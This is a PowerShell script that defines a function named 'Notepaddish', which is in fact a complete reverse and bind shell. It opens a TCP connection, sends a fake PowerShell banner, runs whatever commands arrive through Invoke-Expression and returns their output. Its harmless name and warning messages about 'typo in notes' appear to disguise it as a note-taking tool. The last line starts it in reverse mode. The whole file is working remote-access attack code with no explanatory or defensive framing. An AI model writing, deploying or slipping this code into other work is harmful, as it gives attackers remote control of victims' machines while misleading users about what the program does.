function Notepaddish
{ 

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )
    
    try 
    {
        if ($Reverse)
        {
            $tcpClient = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        if ($Bind)
        {
            $tcpListener = [System.Net.Sockets.TcpListener]$Port
            $tcpListener.start()    
            $tcpClient = $tcpListener.AcceptTcpClient()
        } 

        $networkStream = $tcpClient.GetStream()
        [byte[]]$buffer = 0..65535|%{0}

        $introBytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $networkStream.Write($introBytes,0,$introBytes.Length)
        $promptBytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>') 
        $networkStream.Write($promptBytes,0,$promptBytes.Length)
        while(($readBytes = $networkStream.Read($buffer, 0, $buffer.Length)) -ne 0)
        {
            $textDecoder = New-Object -TypeName System.Text.ASCIIEncoding
            $inputData = $textDecoder.GetString($buffer,0, $readBytes)
            try
            {
                $commandResult = (Invoke-Expression -Command $inputData 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Typo in notes, please check your spelling in the application." 
                Write-Error $_

            }
            $response = $commandResult + 'PS ' + (Get-Location).Path + '> '
            $errorDetails = ($error[0] | Out-String)
            $error.clear()
            $response = $response + $errorDetails

            #Return the results
            $responseBytes = ([text.encoding]::ASCII).GetBytes($response)
            $networkStream.Write($responseBytes,0,$responseBytes.Length)
            $networkStream.Flush()  
        }
        $tcpClient.Close()
        if ($tcpListener)
        {
            $tcpListener.Stop()
        }
    }
    catch
    {
        Write-Warning "Notepaddish was not able to connect, check IP and Port and try again." 
        Write-Error $_
    }
} 

Notepaddish -Reverse -IPAddress 127.0.0.1 -Port 443
